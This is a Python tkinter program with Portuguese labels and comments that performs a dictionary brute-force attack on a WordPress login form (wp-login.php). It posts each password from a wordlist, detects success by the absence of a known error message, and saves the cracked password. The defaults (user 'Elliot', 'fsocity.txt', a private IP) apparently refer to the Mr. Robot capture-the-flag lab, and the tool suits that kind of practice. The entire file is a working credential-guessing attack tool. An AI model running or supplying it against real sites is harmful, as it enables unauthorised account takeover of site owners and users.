import tkinter as tk
from tkinter import filedialog, messagebox
from tkinter import scrolledtext
import requests
from requests.exceptions import RequestException
import threading

# Evento global para controlar a parada do brute force
stop_event = threading.Event()
last_found_password = None  # Variable to store the last found password

def brute_force(username, wordlist_path, error_message, target_url, form_path):
    global last_found_password
    full_url = f"http://{target_url}{form_path}"
    found = False
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = file.read().splitlines()
        
        for password in passwords:
            # Verifica se o evento de parada foi acionado
            if stop_event.is_set():
                log_output.insert(tk.END, "\nBrute force interrompido pelo usuário\n\n")
                log_output.see(tk.END)
                break
            # Pula linhas vazias
            if not password.strip():
                continue
            data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log'
            }
            try:
                response = requests.post(full_url, data=data, allow_redirects=True, timeout=5)
                log_output.insert(tk.END, f"Testando senha: {password}\n")
                log_output.see(tk.END)
                root.update()
                
                if error_message not in response.text:
                    log_output.insert(tk.END, f"\n\nSenha Encontrada: {password}\n")
                    log_output.see(tk.END)                    
                    last_found_password = password  # Store the found password
                    found = True
                    break
            except RequestException as e:
                log_output.insert(tk.END, f"\nErro durante a requisição para {password}: {str(e)}\n")
                log_output.see(tk.END)
    except FileNotFoundError:
        messagebox.showerror("\nErro", "Arquivo de wordlist não encontrado.")
        log_output.insert(tk.END, "\nArquivo de wordlist não encontrado.\n")
    except UnicodeDecodeError as e:
        messagebox.showerror("Erro", f"\nFalha ao decodificar o arquivo de wordlist: {str(e)}")
        log_output.insert(tk.END, f"\nFalha ao decodificar o arquivo de wordlist: {str(e)}\n")
    
    if not found and not stop_event.is_set():
        log_output.insert(tk.END, "\nNenhuma senha Encontrada.\n")
        log_output.see(tk.END)

def save_password():
    global last_found_password
    if last_found_password:
        file_path = filedialog.asksaveasfilename(
            title="Salvar Senha",
            defaultextension=".txt",
            filetypes=[("Arquivos de texto", "*.txt")]
        )
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as file:
                    file.write(f"Senha Encontrada: {last_found_password}\n")
                messagebox.showinfo("Sucesso", f"Senha salva em: {file_path}")
            except Exception as e:
                messagebox.showerror("Erro", f"\nFalha ao salvar a senha: {str(e)}")
    else:
        messagebox.showerror("Erro", "\nNenhuma senha foi encontrada para salvar.")

def start_brute_force():
    username = username_entry.get()
    wordlist_path = wordlist_entry.get()
    error_message = error_entry.get()
    target_url = target_entry.get()
    form_path = form_entry.get()
    
    if not username or not wordlist_path or not error_message or not target_url or not form_path:
        messagebox.showerror("\nErro", "Todos os campos são obrigatórios.")
        return
    
    # Limpa o evento de parada antes de iniciar
    stop_event.clear()
    threading.Thread(target=brute_force, args=(username, wordlist_path, error_message, target_url, form_path), daemon=True).start()

def stop_brute_force():
    stop_event.set()
    log_output.insert(tk.END, "\nInterrompendo brute force\n\n")
    log_output.see(tk.END)

def browse_wordlist():
    file_path = filedialog.askopenfilename(title="Selecionar Wordlist", filetypes=[("Arquivos de texto", "*.txt")])
    if file_path:
        wordlist_entry.delete(0, tk.END)
        wordlist_entry.insert(0, file_path)

# Configuração da interface gráfica
root = tk.Tk()
root.title("Brute Forcer para Formulário HTTP POST")
root.geometry("750x790")

tk.Label(root, text="Nome de usuário:").grid(row=0, column=0, padx=10, pady=5)
username_entry = tk.Entry(root, width=50)
username_entry.grid(row=0, column=1, padx=10, pady=5)
username_entry.insert(0, "Elliot")

tk.Label(root, text="Caminho da Wordlist:").grid(row=1, column=0, padx=2, pady=5)
wordlist_entry = tk.Entry(root, width=50)
wordlist_entry.grid(row=1, column=1, padx=2, pady=5)
wordlist_entry.insert(0, "fsocity.txt")
tk.Button(root, text="Procurar", bg="#c25afa", fg="black", command=browse_wordlist).grid(row=1, column=2, padx=2, pady=5)

tk.Label(root, text="Mensagem de Erro:").grid(row=2, column=0, padx=10, pady=5)
error_entry = tk.Entry(root, width=50)
error_entry.grid(row=2, column=1, padx=10, pady=5)
error_entry.insert(0, "The password you entered for the username")

tk.Label(root, text="IP/URL do Alvo:").grid(row=3, column=0, padx=10, pady=5)
target_entry = tk.Entry(root, width=50)
target_entry.grid(row=3, column=1, padx=10, pady=5)
target_entry.insert(0, "192.168.0.14")

tk.Label(root, text="Caminho do Formulário:").grid(row=4, column=0, padx=10, pady=5)
form_entry = tk.Entry(root, width=50)
form_entry.grid(row=4, column=1, padx=10, pady=5)
form_entry.insert(0, "/wp-login.php")

tk.Button(root, text="Iniciar Brute Force", bg="#03fc24", fg="black", command=start_brute_force).grid(row=5, column=0, padx=10, pady=10)
tk.Button(root, text="Parar Teste", bg="#05f5dd", fg="black", command=stop_brute_force).grid(row=5, column=1, padx=10, pady=10)
tk.Button(root, text="Salvar Senha", bg="#f5ad05", fg="black", command=save_password).grid(row=5, column=2, padx=10, pady=10)

log_output = scrolledtext.ScrolledText(root, width=82, height=30)
log_output.grid(row=6, column=0, columnspan=3, padx=10, pady=10)

root.mainloop()
